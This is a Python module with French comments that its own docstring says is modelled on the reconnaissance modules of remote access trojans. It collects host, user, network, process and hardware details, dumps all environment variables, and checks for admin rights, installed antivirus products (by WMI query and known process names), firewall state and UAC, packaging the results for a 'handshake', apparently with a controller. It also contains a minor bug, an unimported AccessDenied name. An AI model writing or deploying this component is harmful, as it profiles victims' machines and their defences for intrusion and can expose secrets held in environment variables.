"""
System Info Module - Collecte des informations système
Inspiré des modules de reconnaissance des RATs modernes
"""

import platform
import socket
import subprocess
import psutil
import os
import getpass
import uuid
from datetime import datetime
from typing import Dict, Any, List
import logging

logger = logging.getLogger(__name__)

class SystemInfoModule:
    """Module de collecte d'informations système"""
    
    def __init__(self):
        self._cache = {}
        self._cache_timeout = 300  # 5 minutes
        self._last_update = 0
    
    def get_system_info(self) -> Dict[str, Any]:
        """Retourne les informations système de base pour le handshake"""
        try:
            return {
                'hostname': platform.node(),
                'platform': platform.platform(),
                'system': platform.system(),
                'release': platform.release(),
                'version': platform.version(),
                'machine': platform.machine(),
                'processor': platform.processor(),
                'username': getpass.getuser(),
                'ip_address': self._get_local_ip(),
                'mac_address': self._get_mac_address(),
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            logger.error(f"Erreur lors de la collecte des infos système: {e}")
            return {'error': str(e)}
    
    def get_detailed_info(self) -> Dict[str, Any]:
        """Retourne des informations système détaillées"""
        try:
            info = {
                'basic': self.get_system_info(),
                'hardware': self._get_hardware_info(),
                'network': self._get_network_info(),
                'processes': self._get_process_info(),
                'security': self._get_security_info(),
                'environment': self._get_environment_info(),
            }
            return info
        except Exception as e:
            logger.error(f"Erreur lors de la collecte détaillée: {e}")
            return {'error': str(e)}
    
    def get_network_config(self) -> Dict[str, Any]:
        """Retourne la configuration réseau détaillée"""
        try:
            if platform.system().lower() == 'windows':
                result = subprocess.run(
                    ['ipconfig', '/all'], 
                    capture_output=True, 
                    text=True
                )
            else:
                result = subprocess.run(
                    ['ifconfig', '-a'], 
                    capture_output=True, 
                    text=True
                )
            
            return {
                'status': 'success',
                'output': result.stdout if result.stdout else result.stderr
            }
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Erreur lors de la récupération de la config réseau: {e}'
            }
    
    def _get_local_ip(self) -> str:
        """Récupère l'adresse IP locale"""
        try:
            # Méthode fiable pour obtenir l'IP locale
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _get_mac_address(self) -> str:
        """Récupère l'adresse MAC"""
        try:
            mac = uuid.getnode()
            return ':'.join(['{:02x}'.format((mac >> i) & 0xff) for i in range(0, 48, 8)][::-1])
        except:
            return "00:00:00:00:00:00"
    
    def _get_hardware_info(self) -> Dict[str, Any]:
        """Collecte les informations matérielles"""
        try:
            info = {}
            
            # CPU
            info['cpu'] = {
                'physical_cores': psutil.cpu_count(logical=False),
                'total_cores': psutil.cpu_count(logical=True),
                'max_frequency': f"{psutil.cpu_freq().max:.2f}Mhz" if psutil.cpu_freq() else "N/A",
                'current_frequency': f"{psutil.cpu_freq().current:.2f}Mhz" if psutil.cpu_freq() else "N/A",
                'usage': f"{psutil.cpu_percent(interval=1):.1f}%"
            }
            
            # Mémoire
            memory = psutil.virtual_memory()
            info['memory'] = {
                'total': f"{memory.total / (1024**3):.2f} GB",
                'available': f"{memory.available / (1024**3):.2f} GB",
                'used': f"{memory.used / (1024**3):.2f} GB",
                'percentage': f"{memory.percent:.1f}%"
            }
            
            # Disques
            info['disks'] = []
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    info['disks'].append({
                        'device': partition.device,
                        'mountpoint': partition.mountpoint,
                        'filesystem': partition.fstype,
                        'total': f"{usage.total / (1024**3):.2f} GB",
                        'used': f"{usage.used / (1024**3):.2f} GB",
                        'free': f"{usage.free / (1024**3):.2f} GB",
                        'percentage': f"{(usage.used / usage.total) * 100:.1f}%"
                    })
                except PermissionError:
                    continue
            
            # GPU (tentative)
            try:
                if platform.system().lower() == 'windows':
                    result = subprocess.run(
                        ['wmic', 'path', 'win32_VideoController', 'get', 'name'],
                        capture_output=True, text=True
                    )
                    gpu_info = result.stdout.strip().split('\n')[1:]
                    info['gpu'] = [gpu.strip() for gpu in gpu_info if gpu.strip()]
                else:
                    result = subprocess.run(
                        ['lspci | grep -i vga'], 
                        shell=True, capture_output=True, text=True
                    )
                    info['gpu'] = result.stdout.strip().split('\n') if result.stdout else []
            except:
                info['gpu'] = ["Informations GPU non disponibles"]
            
            return info
            
        except Exception as e:
            logger.error(f"Erreur hardware info: {e}")
            return {'error': str(e)}
    
    def _get_network_info(self) -> Dict[str, Any]:
        """Collecte les informations réseau"""
        try:
            info = {}
            
            # Interfaces réseau
            info['interfaces'] = {}
            for interface, addresses in psutil.net_if_addrs().items():
                info['interfaces'][interface] = []
                for addr in addresses:
                    if addr.family == socket.AF_INET:
                        info['interfaces'][interface].append({
                            'type': 'IPv4',
                            'address': addr.address,
                            'netmask': addr.netmask,
                            'broadcast': addr.broadcast
                        })
                    elif addr.family == socket.AF_INET6:
                        info['interfaces'][interface].append({
                            'type': 'IPv6',
                            'address': addr.address,
                            'netmask': addr.netmask
                        })
            
            # Statistiques réseau
            net_io = psutil.net_io_counters()
            info['statistics'] = {
                'bytes_sent': net_io.bytes_sent,
                'bytes_recv': net_io.bytes_recv,
                'packets_sent': net_io.packets_sent,
                'packets_recv': net_io.packets_recv
            }
            
            # Connexions réseau actives
            info['connections'] = []
            try:
                for conn in psutil.net_connections(kind='inet')[:20]:  # Limiter à 20
                    info['connections'].append({
                        'local_address': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A",
                        'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
                        'status': conn.status,
                        'pid': conn.pid
                    })
            except (AccessDenied, PermissionError):
                info['connections'] = ["Accès refusé aux connexions réseau"]
            
            return info
            
        except Exception as e:
            logger.error(f"Erreur network info: {e}")
            return {'error': str(e)}
    
    def _get_process_info(self) -> Dict[str, Any]:
        """Collecte les informations sur les processus"""
        try:
            info = {
                'count': len(psutil.pids()),
                'top_cpu': [],
                'top_memory': []
            }
            
            # Top processus par CPU
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    proc_info = proc.info
                    if proc_info['cpu_percent'] and proc_info['cpu_percent'] > 0:
                        processes.append(proc_info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            
            # Tri par CPU
            processes_cpu = sorted(processes, key=lambda x: x['cpu_percent'], reverse=True)[:10]
            info['top_cpu'] = [
                {
                    'pid': p['pid'],
                    'name': p['name'],
                    'cpu_percent': f"{p['cpu_percent']:.1f}%"
                } for p in processes_cpu
            ]
            
            # Tri par mémoire
            processes_mem = sorted(processes, key=lambda x: x['memory_percent'], reverse=True)[:10]
            info['top_memory'] = [
                {
                    'pid': p['pid'],
                    'name': p['name'],
                    'memory_percent': f"{p['memory_percent']:.1f}%"
                } for p in processes_mem
            ]
            
            return info
            
        except Exception as e:
            logger.error(f"Erreur process info: {e}")
            return {'error': str(e)}
    
    def _get_security_info(self) -> Dict[str, Any]:
        """Collecte les informations de sécurité"""
        try:
            info = {
                'is_admin': self._is_admin(),
                'antivirus': self._detect_antivirus(),
                'firewall': self._check_firewall(),
                'uac_enabled': self._check_uac() if platform.system().lower() == 'windows' else None
            }
            return info
            
        except Exception as e:
            logger.error(f"Erreur security info: {e}")
            return {'error': str(e)}
    
    def _get_environment_info(self) -> Dict[str, Any]:
        """Collecte les informations d'environnement"""
        try:
            info = {
                'environment_variables': dict(os.environ),
                'current_directory': os.getcwd(),
                'python_version': platform.python_version(),
                'executable_path': os.path.abspath(__file__)
            }
            return info
            
        except Exception as e:
            logger.error(f"Erreur environment info: {e}")
            return {'error': str(e)}
    
    def _is_admin(self) -> bool:
        """Vérifie si le processus a des privilèges administrateur"""
        try:
            if platform.system().lower() == 'windows':
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def _detect_antivirus(self) -> List[str]:
        """Détecte les antivirus installés (méthode basique)"""
        try:
            detected_av = []
            
            if platform.system().lower() == 'windows':
                # Vérification via WMI
                try:
                    result = subprocess.run(
                        ['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntiVirusProduct', 'get', 'displayName'],
                        capture_output=True, text=True
                    )
                    if result.stdout:
                        av_list = result.stdout.strip().split('\n')[1:]
                        detected_av = [av.strip() for av in av_list if av.strip()]
                except:
                    pass
                
                # Vérification de processus connus
                av_processes = [
                    'avp.exe', 'avgnt.exe', 'avastui.exe', 'mbam.exe',
                    'msmpeng.exe', 'windefend.exe', 'bdagent.exe'
                ]
                
                for proc in psutil.process_iter(['name']):
                    try:
                        if proc.info['name'].lower() in av_processes:
                            detected_av.append(proc.info['name'])
                    except:
                        pass
            
            return list(set(detected_av))  # Supprimer les doublons
            
        except Exception as e:
            logger.error(f"Erreur détection antivirus: {e}")
            return []
    
    def _check_firewall(self) -> Dict[str, Any]:
        """Vérifie l'état du firewall"""
        try:
            if platform.system().lower() == 'windows':
                result = subprocess.run(
                    ['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                    capture_output=True, text=True
                )
                return {
                    'status': 'enabled' if 'ON' in result.stdout else 'disabled',
                    'details': result.stdout
                }
            else:
                # Vérification iptables/ufw pour Linux
                try:
                    result = subprocess.run(['ufw', 'status'], capture_output=True, text=True)
                    return {
                        'status': 'enabled' if 'active' in result.stdout.lower() else 'disabled',
                        'details': result.stdout
                    }
                except:
                    return {'status': 'unknown', 'details': 'Impossible de vérifier'}
        except Exception as e:
            return {'status': 'error', 'details': str(e)}
    
    def _check_uac(self) -> bool:
        """Vérifie si UAC est activé (Windows uniquement)"""
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
            )
            value, _ = winreg.QueryValueEx(key, "EnableLUA")
            winreg.CloseKey(key)
            return bool(value)
        except:
            return True  # Par défaut, considérer UAC comme activé